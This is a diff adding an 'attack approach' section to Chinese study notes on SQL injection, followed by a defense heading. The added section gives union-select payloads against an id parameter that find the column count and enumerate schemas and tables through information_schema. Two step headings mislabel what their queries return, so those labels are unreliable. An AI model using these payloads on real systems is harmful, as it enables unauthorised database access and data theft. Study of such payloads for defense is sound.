@@ -85,6 +85,32 @@ version\(\) - 数据库版本号。
 
 ### 攻击思路
 
+首先确认注入点存在
+
+通过注入点尝试收集服务端SQL信息如version\(\)、current\_user\(\)。
+
+**确认列数**
+
+```
+?id = -999 union select 1,2,3,4,5    // 通过二分法确认长度
+```
+
+**确认所有表**
+
+```
+?id = -999 union select 1,2,3,4,group_concat(distinct(table_schema)) from information_schema.tables
+```
+
+**确认某表所有列**
+
+```
+?id = -999 union select 1,2,3,4,group_concat(distinct(table_name)) from information_schema.tables where table_schema=database();
+```
+
+**提取数据**
+
+做相应查询。
+
 ### 防御
 
 #### 使用预编译语句
